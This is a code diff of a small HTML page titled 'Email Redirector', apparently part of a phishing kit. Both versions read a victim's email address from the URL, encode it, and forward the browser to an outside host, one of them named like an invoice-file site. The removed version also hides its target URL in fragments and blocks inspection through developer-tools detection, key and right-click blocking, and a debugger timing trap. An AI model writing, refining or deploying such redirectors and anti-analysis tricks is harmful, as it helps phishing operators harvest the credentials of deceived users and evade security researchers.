@@ -2,91 +2,25 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>...</title>
+  <title>Email Redirector</title>
   <script>
-    function bIB(str, bits = 20) {
-      const bitLength = Math.ceil(str.length / bits);
-      const result = [];
-      for (let i = 0; i < bits; i++) {
-        const start = i * bitLength;
-        const end = start + bitLength;
-        result.push(str.slice(start, end));
-      }
-      return result;
-    }
+    function encodeAndRedirect() {
+      const params = new URLSearchParams(window.location.search);
+      const email = params.get("e");
 
-    function combineBits(bits) {
-      return bits.join("");
-    }
-
-    function encodeEmailAndRedirect() {
-      const queryString = window.location.search;
-      const emailPrefix = "E";
-      const emailStartIndex = queryString.indexOf(emailPrefix);
-
-      if (emailStartIndex !== -1) {
-        const email = queryString.slice(emailStartIndex + emailPrefix.length);
-
-        if (email) {
-          const encodedEmail = btoa(email);
-          const redirectUrlBits = [
-            "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
-          ];
-          const emailBits = bIB(encodedEmail);
-          const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
-          window.location.href = finalUrl;
-        } else {
-          alert("!");
-        }
+      if (email) {
+        const encoded = email.replace(/@/g, 'YYY').replace(/\./g, 'ZZZ').split('').reverse().join('');
+        const targetUrl = `https://salesinvfiles.vercel.app/?e=${encoded}`;
+        window.location.href = targetUrl;
       } else {
-        alert("!");
+        document.body.innerHTML = "<h2>No email parameter found in URL.</h2>";
       }
     }
 
-    function detectDevTools() {
-      const devToolsOpened = () => {
-        const widthThreshold = window.outerWidth - window.innerWidth > 160;
-        const heightThreshold = window.outerHeight - window.innerHeight > 160;
-        return widthThreshold || heightThreshold;
-      };
-
-      if (devToolsOpened()) {
-        window.location.href = "https://www.google.com";
-      }
-    }
-
-    setInterval(detectDevTools, 1000);
-
-    document.addEventListener("contextmenu", (e) => {
-      e.preventDefault();
-    });
-
-    document.addEventListener("keydown", (e) => {
-      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "U") || (e.ctrlKey && e.shiftKey && e.key === "C") || (e.ctrlKey && e.key === "S") || (e.ctrlKey && e.key === "J")) {
-        e.preventDefault();
-        window.location.href = "https://www.google.com";
-      }
-    });
-
-    function antiDebugging() {
-      const startTime = performance.now();
-      debugger;
-      const endTime = performance.now();
-      if (endTime - startTime > 100) {
-        window.location.href = "https://www.google.com";
-      }
-    }
-
-    setInterval(antiDebugging, 1000);
-
-    encodeEmailAndRedirect();
+    window.onload = encodeAndRedirect;
   </script>
 </head>
 <body>
-  <h1>...</h1>
+  <p></p>
 </body>
 </html>
-
-
-
